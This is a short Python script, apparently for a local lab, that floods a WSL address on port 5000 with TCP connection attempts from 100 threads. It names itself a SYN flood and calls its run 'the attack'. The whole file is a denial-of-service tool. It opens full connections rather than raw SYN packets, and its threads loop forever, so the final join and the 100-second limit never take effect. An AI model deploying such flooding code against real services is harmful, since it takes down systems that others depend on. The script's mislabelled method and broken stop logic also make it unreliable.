import socket
import threading
import time

HOST = '172.28.35.21'  # Use your WSL IP
PORT = 5000

def syn_flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((HOST, PORT))
        except socket.error:
            pass

threads = []
for _ in range(100):  # Adjust the number of threads as needed
    t = threading.Thread(target=syn_flood)
    t.start()
    threads.append(t)

# Run the attack for 100 seconds
time.sleep(100)

# Stop all threads
for t in threads:
    t.join()